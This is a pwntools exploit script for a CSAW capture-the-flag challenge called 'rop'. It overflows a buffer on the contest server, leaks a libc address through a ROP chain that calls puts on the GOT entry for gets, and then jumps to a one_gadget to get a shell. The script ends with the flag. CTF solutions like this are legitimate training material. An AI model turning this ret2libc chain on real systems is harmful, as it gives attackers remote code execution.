#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('rop')
libc = ELF('./libc-2.27.so')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('pwn.chal.csaw.io', 5016)
pop_rdi = 0x0000000000400683
pop_rsi_r15 = 0x0000000000400681

padding = "A" * 40
chain1 = flat(
	pop_rdi, elf.got['gets'],
	elf.plt.puts,
	elf.symbols['main']
)
p.sendlineafter("Hello\n", padding + chain1)

libc.address = u64(p.recvline(False).ljust(8,"\x00")) - libc.symbols['gets']
log.info("Libc : 0x{:x}".format(libc.address))

chain2 = flat(
	libc.address + 0x10a45c
)

p.sendlineafter("Hello\n", padding + chain2)

p.interactive()
# flag{r0p_4ft3r_r0p_4ft3R_r0p}
